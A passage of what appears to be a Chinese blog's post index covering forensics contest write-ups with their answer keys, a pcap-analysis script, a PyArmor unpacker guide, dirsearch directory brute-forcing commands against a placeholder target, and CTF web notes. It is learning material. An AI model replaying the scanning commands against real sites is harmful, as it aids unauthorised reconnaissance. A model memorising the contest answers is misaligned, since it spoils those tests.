11.【填空题】分析嫌疑人的电脑，嫌疑人的以太坊钱包私钥助记词第4个单词是什么？（答案格式：以实际为准）\n正确答案：\ncloud\n分值：2分\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-11.png)\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-10.png)\n### 12.【填空题】分析嫌疑人的电脑，嫌疑人的Skype账号是多少？（答案格式：以实际为准）\n正确答案：\nlive:.cid.d2bb7d5a13237f1d\n分值：2分\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-12.png)\n### 14.【填空题】分析嫌疑人的电脑，嫌疑人电脑中安装的VPN软件名称是什么？（答案格式：Abc VPN）\n正确答案：\nAny VPN\n分值：2分\n- 注意开始界面啊！！有可能在中间哦 \n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-5.png)\n### 16.【填空题】分析嫌疑人的电脑，该流量包开始抓取第一个分组的时间是什么？（答案格式：1900/01/01 01:00:00）\n正确答案：\n2025/04/03 12:47:18\n分值：2分\n- 文件：1仿真打开wireshark找到；2X-ways搜（复刻失败）3火眼搜（成功）\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-13.png)\n- 暂时不理解这地方怎么搞先记下来\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-14.png)\n- 要注意UTC哦\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-15.png)\n### 17.【单选题】分析嫌疑人的电脑，抓取该流量包的总时长是？\nA. 00:02:14\nB. 00:08:25\nC. 00:18:25\nD. 00:29:31\n【正确答案】A. 00:02:14\n分值：2分\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-15.png)\n- 最后一个包\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-16.png)\n### 18.【单选题】分析嫌疑人的电脑，该流量包中IPV4地址为3.24.46.4的占比是多少？\nA. 96.69%\nB. 97.36%\nC. 98.47%\nD. 99.74%\n【正确答案】D. 99.74%\n分值：2分\n- 用python脚本解决\n```python\n#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\n'''\n只输出指定协议或地址的占比：\n- 输入 pcap/pcapng 路径、协议名（如 TCP/UDP/HTTP/DNS/ICMP）、可选协议地址（仅 IPv4）\n- 仅打印一个数值：满足条件的占比（按字节占比），四舍五入到 4 位小数\n用法示例：\npython analyze_pcap.py \"E:/trace/example.pcapng\" TCP\npython analyze_pcap.py \"E:/trace/example.pcapng\" TCP 3.24.46.4\n'''\n\nimport sys\nfrom typing import Optional\nfrom scapy.all import rdpcap, Packet\nfrom scapy.layers.inet import IP, TCP, UDP, ICMP\nfrom scapy.layers.inet6 import IPv6\ntry:\n    from scapy.layers.http import HTTP\nexcept Exception:\n    HTTP = None  # HTTP 层可能不在所有版本中提供\ntry:\n    from scapy.layers.dns import DNS\nexcept Exception:\n    DNS = None\n\nPROTOCOL_MAP = {\n    \"TCP\": TCP,\n    \"UDP\": UDP,\n    \"ICMP\": ICMP,\n    \"IP\": IP,\n    \"IPv6\": IPv6,\n}\nif HTTP is not None:\n    PROTOCOL_MAP[\"HTTP\"] = HTTP\nif DNS is not None:\n    PROTOCOL_MAP[\"DNS\"] = DNS\n\n\ndef match_protocol(pkt: Packet, proto_name: str) -> bool:\n    if not proto_name:\n        return True\n    name = proto_name.upper()\n    if name in (\"ANY\", \"ALL\", \"*\"):\n        return True\n    # IP: 同时匹配 IPv4 与 IPv6\n    if name == \"IP\":\n        return pkt.haslayer(IP) or pkt.haslayer(IPv6)\n    # IPv4 别名仅匹配 IPv4\n    if name in (\"IPV4\", \"IP4\"):\n        return pkt.haslayer(IP)\n    # IPv6 仅匹配 IPv6\n    if name in (\"IPV6\", \"IP6\"):\n        return pkt.haslayer(IPv6)\n    layer = PROTOCOL_MAP.get(name)\n    if layer is None:\n        return False\n    return pkt.haslayer(layer)\n\n\ndef match_address(pkt: Packet, addr: Optional[str]) -> bool:\n    if not addr:\n        return True\n    # 既支持 IPv4 又支持 IPv6\n    if pkt.haslayer(IP):\n        ip = pkt[IP]\n        return ip.src == addr or ip.dst == addr\n    if pkt.haslayer(IPv6):\n        ip6 = pkt[IPv6]\n        return ip6.src == addr or ip6.dst == addr\n    return False\n\n\ndef packet_len(pkt: Packet) -> int:\n    try:\n        return len(bytes(pkt))\n    except Exception:\n        # 回退：若无法序列化，尝试最外层 len\n        return len(pkt)\n\n\ndef _detect_addr_family(addr: Optional[str]) -> Optional[str]:\n    if not addr:\n        return None\n    if \":\" in addr:\n        return \"ipv6\"\n    if \".\" in addr:\n        return \"ipv4\"\n    return None\n\n\ndef compute_ratio(pcap_path: str, proto_name: str, addr: Optional[str]) -> float:\n    packets = rdpcap(pcap_path)\n    family = _detect_addr_family(addr)\n    total_pkts = 0\n    matched_pkts = 0\n    for pkt in packets:\n        # 如果提供了地址，则仅统计对应地址族的 IP 包；否则统计 IPv4+IPv6\n        if family == \"ipv4\":\n            if not pkt.haslayer(IP):\n                continue\n        elif family == \"ipv6\":\n            if not pkt.haslayer(IPv6):\n                continue\n        else:\n            if not (pkt.haslayer(IP) or pkt.haslayer(IPv6)):\n                continue\n        total_pkts += 1\n        if match_protocol(pkt, proto_name) and match_address(pkt, addr):\n            matched_pkts += 1\n    if total_pkts == 0:\n        return 0.0\n    return matched_pkts / total_pkts\n\n\ndef main():\n    if len(sys.argv) >= 3:\n        pcap_path = sys.argv[1]\n        proto_name = sys.argv[2]\n        addr = sys.argv[3] if len(sys.argv) >= 4 else None\n    else:\n        try:\n            pcap_path = input(\"请输入 pcap 路径: \").strip()\n            proto_name = input(\"请输入协议名（IP/TCP/UDP/ICMP/HTTP/DNS；支持 IPv4/IPV4/IP4/IPv6；ANY/ALL/* 或留空表示不限制；统计口径：若提供地址则按其地址族（IPv4/IPv6）包数占比，否则 IPv4+IPv6）: \").strip()\n            addr_in = input(\"可选地址(IPv4/IPv6，留空则不限制): \").strip()\n        except EOFError:\n            print(\"Usage: python analyze_pcap.py <pcap_path> <protocol> [address]\", file=sys.stderr)\n            sys.exit(1)\n        addr = addr_in if addr_in else None\n    ratio = compute_ratio(pcap_path, proto_name, addr)\n    # 仅输出一个数值，占比，四舍五入 4 位小数\n    print(f\"{ratio:.4f}\")\n\nif __name__ == \"__main__\":\n    main()\n\n```\n\n### 19.【填空题】分析嫌疑人的电脑，嫌疑人使用的AI换脸软件中，当前调用的onnx（Open Neural Network Exchange，开放神经网络交换）格式的模型文件有几个？（答案格式：1）\n正确答案：\n5\n分值：2分\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-17.png)\n### 20.【填空题】分析嫌疑人的电脑，嫌疑人注册登录的数字天堂开发工具的账号是什么？（答案格式：aaa@bbb.ccc）\n正确答案：\nwanggui0411@outlook.com\n分值：2分\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-19.png)\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-18.png)\n### 21.【填空题】分析嫌疑人电脑里的APK前端源码，如办案人员需要对该APK进行调证，请问调证值是多少？（答案格式：英文大写）\n正确答案：\nH5AAA8907\n分值：2分\n- id一般是调证值\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-20.png)\n### 24.【填空题】分析嫌疑人电脑里的APK前端源码，该APK中的API调用的API Server是多少？（答案格式：以实际为准，如http://www.qasz.com/abc/def/）\n正确答案：\nhttp://www.tianxinbobo.com/csapi/uploads/\n分值：2分\n- everything搜前端，X-ways打开右键“同步搜索”，apiserver，搜到index文件\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-21.png)\n- 回虚拟机找\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-22.png)\n## 服务器取证\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-23.png)\n- 加外网卡操作：\n  - 虚拟机-设置-加网络适配器\n  - DHCP要3-254\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-24.png)\n- 连宝塔：\n  - finalshell\n    - ip a\n    - ssh连接服务状态端口查询命令：\n```cmd\nsystemctl status sshd\n```\n  - bt 14\n### 2.【填空题】涉案服务器A的ssh的端口号是多少？\n正确答案：\n222\n分值：2分\n- ssh连接服务状态端口查询命令：\n```cmd\nsystemctl status sshd\n```\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-25.png)\n- 端口查询命令：\n```\nss -tunlp | grep ssh\n```\n### 3.【填空题】分析服务器镜像A，涉案服务器的ip地址是什么？(答案格式：123.123.123.123）\n正确答案：\n10.0.0.11\n分值：2分\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-27.png)\n### 5.【填空题】涉案服务器A中mysql的端口号是多少？（答案格式：123）\n正确答案：\n3340\n分值：2分\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-26.png)\n#### 连接mysql\n  - 宝塔拿到数据库密码：b21829007afcc1a3\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-28.png)\n  - navicat\n    - ssh要填\n    - 常规填mysql数据\n### 7.【填空题】涉案服务器A中宝塔面板最早保存的第一次登陆时的ip地址和端口号是什么？（答案格式：123.456.789.123:456）\n正确答案：\n192.168.136.1:60332\n分值：2分\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-29.png)\n### 8.【填空题】涉案服务器A前端登录网址是什么？（答案格式：http://xxx.xxx.xxx.xxx/../....）\n正确答案：\nhttp://10.0.0.11/mobile/login.html\n分值：2分\n- 域名打不开在host加一条？？？【待】\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-30.png)\n### 9.【填空题】涉案服务器A平台共成功充值了多少金额？（答案格式：12340.56）\n正确答案：\n30920984.57\n分值：2分\n- 这⾥筛选注意，⼀个是系统充值和银⾏⼊款，还有要注意status，应该为1\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-32.png)\n### 10.【填空题】根据涉案服务器A回答，肖一帆一共发展了多少个用户作为直接下线？（答案格式：123）\n正确答案：\n7\n分值：2分\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-33.png)\n### 11.【填空题】根据涉案服务器A中VIP6等级的积分限制是多少？（答案格式：123）\n正确答案：\n1000000\n分值：2分\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-34.png)\n\n### 15.【填空题】根据涉案服务器A分析阿里云接口API的银行卡接口地址是多少？（答案格式：以实际为准）【待】\n正确答案：\nhttps://market.aliyun.com/products/56928004/cmapi012976.html\n分值：2分\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-35.png)\n\n### 16.【填空题】分析嫌疑人的云服务器B，涉案服务器中Java网站源码jar包名称是？（答案格式：包含后缀）\n正确答案：\nbh-wms-0.0.1-SNAPSHOT.jar\n分值：2分\n- 服务器B输入```find / -name *.jar```，找不到可以把输出结果变成文档```find / -name *.jar > jar.txt```，最后找到```/project/bh-wms-0.0.1-SNAPSHOT.jar```\n\n### 17.【填空题】分析嫌疑人的云服务器B，涉案Java网站数据库root账号的密码是多少？（答案格式：Abc@123456）\n正确答案：\nTuojie@666\n分值：2分\n- 16题文件恢复出来放jadx\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-37.png)\n### 18.【填空题】分析嫌疑人的云服务器B，涉案Java网站的端口是多少？（答案示例：3123）\n正确答案：\n8080\n分值：2分\n- ```java -jar bh-wms-0.0.1-SNAPSHOT.jar```，finalshell连接```ss -tunlp```多出来一个8080端口\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-38.png)\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-39.png)\n### 19.【填空题】分析嫌疑人的云服务器B，该网站后台保留的登录账号的用户昵称为？（答案格式：老李）\n正确答案：\n三弟\n分值：2分\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-40.png)\n### 20.【填空题】分析嫌疑人的云服务器B，位于南京市江宁区的货物仓库存有多少个产品？（答案格式：123）\n正确答案：\n21626\n分值：2分\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-41.png)\n","tags":["ctf","wp"],"categories":["wp"]},{"title":"PyArmor-Unpacker使用教程","url":"/2025/10/21/PyArmor-Unpacker使用教程/","content":"# Readme.md文件翻译\n\n[Pyarmor](https://github.com/dashingsoft/pyarmor) 是一款流行的 Python 源代码保护工具。它将 Python 脚本转换为二进制数据，这些数据可以看作是 pyc 文件的加密变体。它们可以通过一个共享库（pyarmor_runtime）解密，然后由 Python 解释器执行。\n\n本项目旨在将受保护的（armored）数据转换回字节码汇编，并（实验性地）转换回源代码。我们复刻了优秀的 [Decompyle++](https://github.com/zrax/pycdc)（又名 pycdc），并在其基础上添加了一些处理流程，例如修改抽象语法树。\n\n> [!IMPORTANT]\n>\n> 此工具仅应用于您拥有或已获授权分析的脚本。请尊重软件许可证和服务条款。作者不对因使用此工具造成的任何误用或损害负责。\n\n> [!NOTE]\n>\n> 与其他反编译器一样，此工具面向专业用户。您应对 Python 字节码有基本的了解。如果不是，您可能需要向了解的人寻求帮助。\n\n> [!WARNING]\n>\n> **反汇编结果是准确的，但反编译的代码可能不完整或不正确。** [参见 issue #3](https://github.com/Lil-House/Pyarmor-Static-Unpack-1shot/issues/3)\n\n## 特性\n\n### 静态分析\n\n您无需执行加密的脚本。我们使用与 pyarmor_runtime 相同的算法来解密它们。这在脚本不可信时非常有用。\n\n### 通用性强\n\n目前我们正尝试支持 Pyarmor 8.0 到 9.1.x（最新版），Python 3.7 到 3.13，在所有操作系统上，并尽可能支持多种混淆选项。（然而，我们的测试有限。）\n\n> [!NOTE]\n>\n> 如果数据以 `PY` 开头，后跟六位数字，则受支持。否则，如果它以 `PYARMOR` 开头，则是由 Pyarmor 7 或更早版本生成的，不受支持。\n\n### 易于使用\n\n您唯一需要做的是指定您混淆脚本的位置。该工具将完成所有工作，如检测受保护数据、解析、反汇编和反编译。请参阅下面的\"使用方法\"部分。\n\n## 构建\n\n```bash\nmkdir build\ncd build\ncmake ../pycdc\ncmake --build .\ncmake --install .\n```\n您也可以在[发布页面](https://github.com/Lil-House/Pyarmor-Static-Unpack-1shot/releases)下载预编译的二进制文件。\n### 使用方法\n```bash\npython /path/to/oneshot/shot.py /path/to/scripts\n```\n在运行 shot.py 之前，请确保 oneshot 目录中存在可执行文件 pyarmor-1shot（在 Windows 上是 pyarmor-1shot.exe）。\n\n您只需要指定包含所有受保护数据和 pyarmor_runtime 的目录。该工具会尽可能地递归查找和处理它们。\n\n必要时，可以使用 -r path/to/pyarmor_runtime[.pyd|.so|.dylib] 来指定一个 pyarmor_runtime 可执行文件。\n\n所有由此工具生成的文件在其文件名中都包含 .1shot.。如果您想将它们保存到另一个目录而不是原地保存，请使用 -o another/path/。文件夹结构将保持不变。\n\n注意：\n\n- 如果文件夹名称恰好是 __pycache__ 或 site-packages，或者它直接包含一个名为 .no1shot 的文件，则其子目录将不会被处理，并且符号链接不会被跟踪，以避免重复或无限循环并节省时间。如果您确实需要处理它们，请稍后在这些目录中运行脚本并指定运行时。\n\n- 由 PyInstaller 等生成的归档文件、可执行文件等，必须在使用其他工具解包后再进行解密，否则您可能会遇到未定义的行为。\n\n### 反馈\n如果您有任何疑问、建议或问题，请随时提出 issue。如果可能，请不要忘记附上受保护的数据和 pyarmor_runtime 可执行文件。\n\n### 待办事项（欢迎提交 PR！）\n多平台 pyarmor_runtime 可执行文件支持\n\n支持更多混淆选项\n\n为其他后端重新生成 pyc\n\n文档（不接受关于此部分的 PR）\n\n### 致 CTF 挑战赛出题人\n请不要制作那些关于寻找和使用现有工具的 CTF（夺旗赛）逆向挑战。这对任何人都没有乐趣。这更像是一场捉迷藏游戏，而不是对技能和创造力的考验。\n\n理解 Pyarmor 或此工具的工作原理，并尝试改进它们，会更有意义。\n\nStar 趋势图\n<https://starchart.cc/Lil-House/Pyarmor-Static-Unpack-1shot.svg?variant=adaptive>\n\n# 具体使用方法\n- payload\n```python\npython E:\\app-down\\ctf工具箱\\ctf工具箱\\pyarmor-1shot-v0.2.1-windows-x86_64\\oneshot\\shot.py (待解密文件位置)\n```\n- 解密后的文件应该会生成在相同目录下，文件名会包含 .1shot. 标识，例如：\n  - start.1shot.dis.py (反汇编结果)\n  - start.1shot.py (反编译的源代码)"},{"title":"dirsearch使用方法","url":"/2025/10/21/dirsearch使用方法/","content":"### 选项:\n\n--version 显示程序的版本号并退出\n\n-h, --help 显示此帮助消息并退出\n\n必需：\n\n-u URL, --url=URL 目标URL，可以使用多个选项指定多个目标URL\n\n-l PATH, --urls-file=PATH\n\nURL列表文件\n\n--stdin 从标准输入读取URL\n\n--cidr=CIDR 目标CIDR\n\n--raw=PATH 从文件加载原始HTTP请求（使用'--scheme'标志设置方案）\n\n-s SESSION_FILE, --session=SESSION_FILE\n\n会话文件\n\n--config=PATH 配置文件路径（默认为'DIRSEARCH_CONFIG'环境变量，否则为'config.ini'）\n\n字典设置:\n\n-w WORDLISTS, --wordlists=WORDLISTS\n\n单词列表文件或包含单词列表文件的目录（以逗号分隔）\n\n-e EXTENSIONS, --extensions=EXTENSIONS\n\n扩展名列表，以逗号分隔（例如：php,asp）\n\n-f, --force-extensions\n\n在每个单词列表条目的末尾添加扩展名。默认情况下，dirsearch只替换%EXT%关键字为扩展名。\n\n-O, --overwrite-extensions\n\n使用指定的扩展名覆盖单词列表中的其他扩展名（通过'-e'选择）\n\n--exclude-extensions=EXTENSIONS\n\n排除的扩展名列表，以逗号分隔（例如：asp,jsp）\n\n--remove-extensions 删除所有路径中的扩展名（例如：admin.php -> admin）\n\n--prefixes=PREFIXES 将自定义前缀添加到所有单词列表条目中（以逗号分隔）\n\n--suffixes=SUFFIXES 将自定义后缀添加到所有单词列表条目中，忽略目录（以逗号分隔）\n\n-U, --uppercase 单词列表转为大写\n\n-L, --lowercase 单词列表转为小写\n\n-C, --capital 单词首字母大写\n\n通用设置:\n\n-t THREADS, --threads=THREADS\n\n线程数\n\n-r, --recursive 递归地进行强制破解\n\n--deep-recursive 在每个目录深度上执行递归扫描（例如：api/users -> api/）\n\n--force-recursive 对找到的每个路径执行递归强制破解，而不仅仅是目录\n\n-R DEPTH, --max-recursion-depth=DEPTH\n\n最大递归深度\n\n--recursion-status=CODES\n\n用于执行递归扫描的有效状态码，支持范围（以逗号分隔）\n\n--subdirs=SUBDIRS 扫描给定URL的子目录（以逗号分隔）\n\n--exclude-subdirs=SUBDIRS\n\n在递归扫描期间排除以下子目录（以逗号分隔）\n\n-i CODES, --include-status=CODES\n\n包括的状态码，以逗号分隔，支持范围（例如：200,300-399）\n\n-x CODES, --exclude-status=CODES\n\n排除的状态码，以逗号分隔，支持范围（例如：301,500-599）\n\n--exclude-sizes=SIZES\n\n根据大小排除响应，以逗号分隔（例如：0B,4KB）\n\n--exclude-text=TEXTS 根据文本排除响应，可以使用多个标志\n\n--exclude-regex=REGEX\n\n根据正则表达式排除响应\n\n--exclude-redirect=STRING\n\n如果此正则表达式（或文本）与重定向URL匹配，则排除响应（例如：'/index.html'）\n\n--exclude-response=PATH\n\n排除类似于此页面响应的响应，路径作为输入（例如：404.html）\n\n--skip-on-status=CODES\n\n每当命中这些状态码之一时跳过目标，以逗号分隔，支持范围\n\n--min-response-size=LENGTH\n\n响应的最小长度\n\n--max-response-size=LENGTH\n\n响应的最大长度\n\n--max-time=SECONDS 扫描的最大运行时间\n\n--exit-on-error 发生错误时退出\n\n请求设置:\n\n-m METHOD, --http-method=METHOD\n\nHTTP请求方法（默认为GET）\n\n-d DATA, --data=DATA HTTP请求数据\n\n--data-file=PATH 包含HTTP请求数据的文件\n\n-H HEADERS, --header=HEADERS\n\nHTTP请求标头，可以使用多个标志\n\n--headers-file=PATH 包含HTTP请求标头的文件\n\n-F, --follow-redirects\n\n跟随HTTP重定向\n\n--random-agent 每个请求选择一个随机User-Agent\n\n--auth=CREDENTIAL 认证凭据（例如：user:password或bearer token）\n\n--auth-type=TYPE 认证类型（basic、digest、bearer、ntlm、jwt）\n\n--cert-file=PATH 包含客户端证书的文件\n\n--key-file=PATH 包含客户端证书私钥的文件（未加密）\n\n--user-agent=USER_AGENT\n\n--cookie=COOKIE\n\n连接设置:\n\n--timeout=TIMEOUT 连接超时时间\n\n--delay=DELAY 请求之间的延迟\n\n-p PROXY, --proxy=PROXY\n\n代理URL（HTTP/SOCKS），可以使用多个标志\n\n--proxies-file=PATH 包含代理服务器的文件\n\n--proxy-auth=CREDENTIAL\n\n代理认证凭据\n\n--replay-proxy=PROXY 用于重放已发现路径的代理\n\n--tor 使用Tor网络作为代理\n\n--scheme=SCHEME 原始请求的协议或URL中没有协议时使用的协议（默认为自动检测）\n\n--max-rate=RATE 每秒请求数最大值\n\n--retries=RETRIES 失败请求的重试次数\n\n--ip=IP 服务器IP地址\n\n高级设置:\n\n--crawl 在响应中爬取新路径\n\n显示设置:\n\n--full-url 在输出中显示完整URL（在静默模式下自动启用）\n\n--redirects-history 显示重定向历史记录\n\n--no-color 不使用彩色输出\n\n-q, --quiet-mode 安静模式\n\n输出设置:\n\n-o PATH/URL, --output=PATH/URL\n\n输出文件或MySQL/PostgreSQL数据库URL（格式：\n\nscheme://[username:password@]host[:port]/database-\n\nname）\n\n--format=FORMAT 报告格式（可用：simple、plain、json、xml、md、csv、html、\n\nsqlite、mysql、postgresql）\n\n--log=PATH 日志文件\n\n### payload\n```cmd\npython3 dirsearch.py -e php,txt,zip -u https://target     //简单的查看网址目录和文件\n\npython3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt        //使用文件拓展名为php,txt,zip的字典扫描目标url\n\npython3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --recursive -R 2\n\npython3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --recursive -R 4 --scan-subdirs=/,/wp-content/,/wp-admin/\n\npython3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --exclude-texts=This,AndThat\n\npython3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt -H \"User-Agent: IE\"\n\npython3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt -t 20\n\npython3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --random-agents\n\npython3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --json-report=reports/target.json\n\npython3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --simple-report=reports/target-paths.txt\n\npython3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --plain-text-report=reports/target-paths-and-status.js\n```"},{"title":"http状态码","url":"/2025/10/21/http状态码/","content":"| 状态码 | 英文名称                  | 中文描述                                                                 |\n|--------|---------------------------|--------------------------------------------------------------------------|\n| 100    | Continue                  | 继续。客户端应继续其请求                                                 |\n| 101    | Switching Protocols       | 切换协议。服务器根据客户端的请求切换协议，只能切换到更高级的协议         |\n| 200    | OK                        | 请求成功。一般用于 GET 与 POST 请求                                      |\n| 201    | Created                   | 已创建。成功请求并创建了新的资源                                         |\n| 202    | Accepted                  | 已接受。已经接受请求，但未处理完成                                       |\n| 203    | Non-Authoritative Info    | 非授权信息。请求成功，但返回的 meta 信息不在原始服务器，而是一个副本     |\n| 204    | No Content                | 无内容。服务器成功处理，但未返回内容                                     |\n| 205    | Reset Content             | 重置内容。服务器处理成功，用户终端应重置文档视图                         |\n| 206    | Partial Content           | 部分内容。服务器成功处理了部分 GET 请求                                  |\n| 300    | Multiple Choices          | 多种选择。请求的资源可包括多个位置                                       |\n| 301    | Moved Permanently         | 永久移动。请求的资源已被永久移动到新 URI                                 |\n| 302    | Found                     | 临时移动。资源只是临时被移动，客户端应继续使用原有 URI                   |\n| 303    | See Other                 | 查看其它地址。使用 GET 和 POST 请求查看                                  |\n| 304    | Not Modified              | 未修改。所请求的资源未修改，服务器不会返回任何资源                       |\n| 305    | Use Proxy                 | 使用代理。所请求的资源必须通过代理访问                                   |\n| 306    | Unused                    | 已经被废弃的 HTTP 状态码                                                 |\n| 307    | Temporary Redirect        | 临时重定向。与 302 类似，使用 GET 请求重定向                             |\n| 400    | Bad Request               | 客户端请求的语法错误，服务器无法理解                                     |\n| 401    | Unauthorized              | 请求要求用户的身份认证                                                   |\n| 402    | Payment Required          | 保留，将来使用                                                           |\n| 403    | Forbidden                 | 服务器理解请求，但拒绝执行                                               |\n| 404    | Not Found                 | 服务器无法根据请求找到资源                                               |\n| 405    | Method Not Allowed        | 客户端请求中的方法被禁止                                                 |\n| 406    | Not Acceptable            | 服务器无法根据客户端请求的内容特性完成请求                               |\n| 407    | Proxy Auth Required       | 请求要求代理的身份认证                                                   |\n| 408    | Request Timeout           | 服务器等待客户端发送的请求时间过长，超时                                 |\n| 409    | Conflict                  | 服务器处理请求时发生了冲突                                               |\n| 410    | Gone                      | 客户端请求的资源已经不存在                                               |\n| 411    | Length Required           | 服务器无法处理不带 Content-Length 的请求信息                             |\n| 412    | Precondition Failed       | 客户端请求信息的先决条件错误                                             |\n| 413    | Request Entity Too Large  | 请求的实体过大，服务器无法处理                                           |\n| 414    | Request-URI Too Large     | 请求的 URI 过长，服务器无法处理                                          |\n| 415    | Unsupported Media Type    | 服务器无法处理请求附带的媒体格式                                         |\n| 416    | Requested Range Not Satisfiable | 客户端请求的范围无效                                               |\n| 417    | Expectation Failed        | 服务器无法满足请求头中 Expect 字段指定的预期行为                         |\n| 418    | I'm a teapot              | 状态码 418 是一个愚人节玩笑，定义于 RFC 2324                             |\n| 500    | Internal Server Error     | 服务器内部错误，无法完成请求                                             |\n| 501    | Not Implemented           | 服务器不支持请求的功能，无法完成请求                                     |\n| 502    | Bad Gateway               | 作为网关或代理的服务器从远程服务器接收到无效响应                         |\n| 503    | Service Unavailable       | 服务器暂时无法处理请求，可能因超载或系统维护                             |\n| 504    | Gateway Timeout           | 充当网关或代理的服务器未及时从远端服务器获取请求                         |\n| 505    | HTTP Version Not Supported| 服务器不支持请求的 HTTP 协议版本                                         |","tags":["ctf","web"],"categories":["知识点笔记"]},{"title":"2024美亚杯个人资格赛wp","url":"/2025/10/20/2024美亚杯个人资格赛wp/","content":"- 由于学校网络太烂，平航杯检材误删。。开始先看网上的2024美亚杯个人资格赛wp，先行梳理思路\n### 题目：\n![alt text](/img/2024美亚杯个人资格赛wp_image.png)\n\n### 1. [单选题] Emma已经几天没有收到她姐姐Clara的消息了，报警失踪，她焦虑地将手机提交给警察，希望能找到线索。警察将手机交给你进行电子数据取证。你成功提取了Emma手机的镜像。请根据取证结果回答以下问题。根据Emma_Mobile.zip，Emma和Clara的微信聊天记录，Emma最后到警署报案并拍摄写有报案编号的卡片，拍摄时的经纬值是多少？(2分)\nA. 22.451721666667, 114.171853333333\nB. 22.451553333333, 114.172845\nC. 22.451928333333, 114.170503333333\nD. 22.451638333333, 114.16993\n- 图片经纬度\n  - 法一：exiftool查看器：便利使用方法是把图片拖到exe文件上打开，此题信息没藏里面但有学习价值；已知是苹果手机，所以我们应该去手机数据库中找到原有格式的手机相关内容，翻到数据库中的最后标签为19的heic文件时间和之前我们找到的.pic文件时间相同 所以这张照片应该是传输前发送的原图然后翻看到别的表中，就可以找到这个图片的坐标信息\n  - 法二：在Emma的图库里面找到了这张图片，在message_2.sqlite数据库里面找到了这张图片的具体信息，可以找到图片的UUID内容，根据UUID直接在数据库Photos.sqlite里面找到。问了一下ai，感觉UUID就像是Photos.sqlite专属的哈希值一样的东西。\n- AutoPsy：虽然不如商业软件强, 但是兼容性非常强, 各种提取软件生成的奇奇怪怪的格式的文件集合, 多少都能识别出来一些。本部分题目关联的检材 Emma_Mobile.zip 是文件集合, 数据库文件(DB 目录)和 plist (plist 目录)按照文件类型归类. 本身不是镜像文件, 仅提取了部分文件系统中的文件(Active 目录), 因此将整个压缩包放入取证软件进行自动取证也会缺少很多信息.\n  - 不会用\n\n\n### 参考：\n[2024年美亚杯个人赛 资格赛 wp](https://blog.csdn.net/2301_77163694/article/details/143671589)\n[2024年美亚杯团体赛wp](https://blog.csdn.net/2301_81210668/article/details/147111162)\n[美亚杯2024个人赛题解](https://forensics.xidian.edu.cn/wiki/MeiyaCup2024Individual/)\n[2024美亚杯个人赛](https://www.cnblogs.com/zzpu213/p/18794234)\n\n\n\n\n\n","tags":["ctf","美亚杯","wp"],"categories":["wp"]},{"title":"ctfshow-web合集wp","url":"/2025/10/20/ctfshow-web合集wp/","content":"#### web1\n- 使用浏览器自带的审计功能F12可以查看网站源代码.\n- 前端的HTML（超文本标记语言）中，如果想要添加注释，需要使用<!--注释内容--> 注释标签。该标签用来在源文档中插入注释，注释不会在浏览器中显示。\n- 在URL前可以通过添加 view-source:URL 实现绕过前端限制显示网页源码.\n\n#### web2\n- JavaScript实现禁用代码审计\n```java\n//禁用鼠标右键\nwindow.document.oncontextmenu = function() {\n    return false;\n}\n//禁用复制\nwindow.document.onselectstart = function() {\n    return false;\n}\n//禁用F12\ndocument.onkeydown = function() {\n    if(window.event && window.event.keyCode == 123) {\n        event.keyCode = 0;\n        event.returnValue = false;\n        return false;\n    }\n};\n```\n#### web3\n- 自带工具直接抓包\n![alt text](/img/ctfshow-web合集wp_w-1.png)\n\n#### web4\n- 提示了robot题型\n![alt text](/img/ctfshow-web合集wp_image.png)\n![alt text](/img/ctfshow-web合集wp_image-1.png)\n\n#### web5\n- phps源码泄露\n- PHPS 文件是 PHP 源代码文件，通常用于通过 Web 浏览器直接查看 PHP 代码内容。然而，这种文件可能导致源码泄露，带来安全隐患。\n- [http状态码](/2025/10/21/http状态码)\n![alt text](/img/ctfshow-web合集wp_image-2.png)\n![alt text](/img/ctfshow-web合集wp_image-3.png)\n- 使用工具：[dirsearch](/2025/10/21/http状态码)\n\n#### web6\n- 题目\n  - 解压源码到当前目录，测试正常，收工\n  - 考察代码泄露。直接访问url/www.zip,获得flag\n- 知识点：网站主页源码文件名称为 www.zip ，然后再URL后添加/www.zip对网站主页源码进行下载,然后进行解压\n\n![alt 